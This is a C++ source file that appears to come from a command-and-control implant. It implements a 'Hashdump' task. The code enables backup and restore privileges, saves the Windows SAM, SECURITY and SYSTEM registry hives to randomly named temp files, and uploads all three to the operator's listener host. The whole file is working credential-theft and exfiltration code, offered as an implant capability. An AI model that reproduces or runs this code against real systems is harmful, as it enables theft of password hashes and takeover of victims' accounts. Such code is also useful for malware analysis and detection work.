#include "core/task.hpp"

namespace Task
{
    namespace Helper::Hashdump
    {
        BOOL SaveRegHive(
            Procs::PPROCS pProcs,
            const std::wstring& wHiveKey,
            const std::wstring& wSavePath
        ) {
            HKEY hKey;
            LONG result = pProcs->lpRegOpenKeyExW(HKEY_LOCAL_MACHINE, wHiveKey.c_str(), 0, KEY_READ, &hKey);
            if (result != ERROR_SUCCESS)
            {
                if (result == ERROR_ACCESS_DENIED)
                {
                    // Stdout::DisplayMessageBoxA("ERROR_ACCESS_DENIED", "RegOpenKeyExW");
                }
                return FALSE;
            }

            result = pProcs->lpRegSaveKeyW(hKey, wSavePath.c_str(), nullptr);
            if (result != ERROR_SUCCESS)
            {
                pProcs->lpRegCloseKey(hKey);
                return FALSE;
            }

            pProcs->lpRegCloseKey(hKey);
            return TRUE;
        }
    }

    std::wstring Hashdump(State::PSTATE pState)
    {
        // Enable privileges
        HANDLE hToken;
        if (!pState->pProcs->lpOpenProcessToken(
            NtCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken
        )) {
            return L"Error: Failed to open token handle.";
        }
        if (!System::Priv::PrivilegeSet(
            pState->pProcs,
            hToken,
            SE_BACKUP_NAME,
            TRUE
        )) {
            pState->pProcs->lpCloseHandle(hToken);
            return L"Error: Failed to set SeBackupPrivilege.";
        }
        if (!System::Priv::PrivilegeSet(
            pState->pProcs,
            hToken,
            SE_RESTORE_NAME,
            TRUE
        )) {
            pState->pProcs->lpCloseHandle(hToken);
            return L"Error: Failed to set SeRestorePrivilege.";
        }

        // Get Temp path
        std::wstring wTempPath = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%");
        // Set save paths
        std::wstring wSamPath = wTempPath + L"\\" + Utils::Random::RandomString(8);
        std::wstring wSecurityPath = wTempPath + L"\\" + Utils::Random::RandomString(8);
        std::wstring wSystemPath = wTempPath + L"\\" + Utils::Random::RandomString(8);

        // Save registry hives.
        if (!Helper::Hashdump::SaveRegHive(pState->pProcs, L"SAM", wSamPath))
        {
            return L"Error: Failed to save SAM.";
        }
        if (!Helper::Hashdump::SaveRegHive(pState->pProcs, L"SECURITY", wSecurityPath))
        {
            return L"Error: Failed to save SECURITY.";
        }
        if (!Helper::Hashdump::SaveRegHive(pState->pProcs, L"SYSTEM", wSystemPath))
        {
            return L"Error: Failed to save SYSTEM.";
        }

        // Upload these hives.
        std::wstring wHeaders = L"";
        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
        wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";

        std::wstring wSamUploadPath = L"/tmp/sam_" + Utils::Random::RandomString(8) + L".hive";
        std::wstring wHeadersSam = wHeaders + L"X-FILE: " + wSamUploadPath + L"\r\n";
        if (!System::Http::FileUpload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeadersSam.c_str(),
            wSamPath.c_str()
        )) {
            return L"Error: Failed to upload SAM.";
        }
        std::wstring wSecurityUploadPath = L"/tmp/security_" + Utils::Random::RandomString(8) + L".hive";
        std::wstring wHeadersSecurity = wHeaders + L"X-FILE: " + wSecurityUploadPath + L"\r\n";
        if (!System::Http::FileUpload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeadersSecurity.c_str(),
            wSecurityPath.c_str()
        )) {
            return L"Error: Failed to upload SAM.";
        }
        std::wstring wSystemUploadPath = L"/tmp/system_" + Utils::Random::RandomString(8) + L".hive";
        std::wstring wHeadersSystem = wHeaders + L"X-FILE: " + wSystemUploadPath + L"\r\n";
        if (!System::Http::FileUpload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathUpload,
            wHeadersSystem.c_str(),
            wSystemPath.c_str()
        )) {
            return L"Error: Failed to upload SAM.";
        }

        // Set hive paths
        return wSamUploadPath + L"," + wSecurityUploadPath + L"," + wSystemUploadPath;
    }
}